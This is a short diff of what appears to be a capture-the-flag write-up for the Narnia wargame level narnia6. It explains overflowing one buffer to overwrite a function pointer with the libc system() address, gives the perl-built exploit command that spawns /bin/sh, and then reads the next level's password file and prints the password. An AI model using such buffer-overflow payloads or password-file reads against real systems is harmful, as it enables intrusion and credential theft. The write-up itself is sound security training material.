@@ -26,6 +26,9 @@ This sequence of commands gives us the following line of output:
 $1 = {int (const char *)} 0xf7c48170 <__libc_system>  
 So now we now that 0xf7c48170 is the address that points to system() in the libc library.
 
+So fill b1 with 8 A's then overwrite the address poitned to by fp.  
+Then fill b2 with 8 B's then overwrite the junk stored in b1 with the command we want to execute.  
+
 $ ./narnia6 $(perl -e 'print "AAAAAAAA\x70\x81\xc4\xf7\ BBBBBBBB/bin/sh"')  
 $ cat /etc/narnia_pass/narnia7  
 Pass: YY4F9UaB60  
